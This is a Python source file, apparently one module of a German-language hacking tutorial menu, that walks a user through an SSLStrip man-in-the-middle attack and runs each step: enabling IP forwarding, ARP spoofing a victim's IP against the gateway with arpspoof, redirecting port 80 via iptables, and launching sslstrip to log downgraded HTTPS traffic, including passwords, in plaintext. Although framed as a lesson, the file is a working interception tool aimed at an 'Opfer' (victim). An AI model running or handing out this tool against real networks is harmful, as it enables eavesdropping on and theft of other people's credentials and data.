#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import readline
import colors

from generics import rlinput, execute, clearScreen

def Start():
	shellCols = colors.ShellColors
	showMenu = True
	while(showMenu):
		clearScreen()
		print(shellCols.UNDERLINE + shellCols.HEADER + 'SSLStrip-Attacke: ' + shellCols.ENDC + '\n')

		##Ip-Forward aktivieren
		print('In diesem Tutorial werden alle HTTPS-Links des Opfers durch HTTP-Links ersetzt und der Verkehr wird zusätzlich per ARP Spoofing über den eigenen Server geleitet. Dadurch ist es möglich alle Daten (auch Passwörter, etc.) auszulesen.')

		command = rlinput('Als Erstes wird IP-Forwarding mit folgendem Befehl aktiviert: \n# ' , 'sysctl -w net.ipv4.ip_forward=1')
		os.system(command)
		print('\n')

		selection = raw_input(shellCols.BLUE + '\nDrücke Enter um fortzufahren oder x um das Programm zu verlassen... ' + shellCols.ENDC + '\n')
		if(selection == "x"):
			print('Gehe zurück zum Hauptmenü')
			showMenu = False
			break

		##Netzwerkkonfiguration auslesen
		command = rlinput('Rufe nun die Konfiguration deiner IP-Netzwerkschnittstellen auf und lies dort dein Gateway und dein Interface aus: ', 'ifconfig')
		os.system(command)
		print('\n')

		##ARP Spoofing starten
		victim_ipadress = raw_input('Gib nun die IP-Adresse des Opfers ein (das Opfer gibt ifconfig zum Auslesen ein): ')
		network_interface = raw_input('Gib nun den Namen des Interfaces des Netzwerkes ein, in dem sich sowohl Angreifer als auch Opfer befinden: ')
		gateway_ipadress = raw_input('Gib nun die IP-Adresse des Gateways ein: ')
		command = rlinput('Nun wird mit folgendem Befehl der Angriff mittels arpspoof gestartet:\n# ', 'arpspoof -i ' + network_interface + ' -t ' + victim_ipadress + ' ' + gateway_ipadress)
		p = execute(command)
		print('\n')
		print('Nun wird der gesamte Netzwerkverkehr des Opfers über unseren Rechner umgeleitet und erlaubt so die Einsicht und Manipulation der Inhalte.')

		selection = raw_input(shellCols.BLUE + '\nDrücke Enter um fortzufahren oder x um das Programm zu verlassen... ' + shellCols.ENDC + '\n')
		if(selection == "x"):
			print('Gehe zurück zum Hauptmenü')
			showMenu = False
			break

		##Weitergeben der Pakete via IPtables an SSLStrip
		print('Jetzt müssen alle ankommenden Pakete an das Tool SSLStrip weitergegeben werden, damit sie verschlüsselt an den eigentlichen Zielserver weitergeleitet werden können.')

		listen_port = raw_input('Gibt den Port an, auf den gelauscht werden soll (zum Beispiel 8080): ')
		command = rlinput('Weiterleiten der Pakete via IPtables: \n# ' , 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ' + listen_port)
		os.system(command)
		print('\n')

		selection = raw_input(shellCols.BLUE + '\nDrücke Enter um fortzufahren oder x um das Programm zu verlassen... ' + shellCols.ENDC + '\n')
		if(selection == "x"):
			print('Gehe zurück zum Hauptmenü')
			showMenu = False
			break

		##Starte das SSLStrip-Programm
		print('Nun kann das eigentliche SSLStrip gestartet werden.')

		log_path = raw_input('Gibt nur noch Pfad und Dateinamen an, in dem die HTTPS-Nachrichten im Klartext gespeichert werden sollen: ')
		command = rlinput('Weiterleiten der Pakete via IPtables: \n# ' , 'sslstrip -a -k -l ' + listen_port + ' -w ' + log_path)
		os.system(command)
		print('\n')

		##Beende Program
		selection = raw_input(shellCols.BLUE + '\nDrücke 0 um zum Menü zurückzukehren.' + shellCols.ENDC)
		os.system('sysctl -w net.ipv4.ip_forward=0')
		os.system('iptables -t nat -F')
		print('Gehe zurück zum Hauptmenü')
		showMenu = False
		break


